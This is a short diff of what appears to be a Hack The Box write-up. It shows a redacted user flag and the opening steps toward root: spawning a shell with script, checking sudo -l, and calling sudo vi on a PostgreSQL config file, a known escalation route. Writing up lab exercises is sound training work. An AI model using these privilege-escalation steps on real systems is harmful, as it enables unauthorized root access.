@@ -37,7 +37,7 @@
    /var/lib/postgresql/user.txt
     cat /var/lib/postgresql/user.txt
     HTB{∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎}
-    **Flag Root**
+ **Flag Root**
      SHELL=/bin/bash script -q /dev/null
      sudo -l
      sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
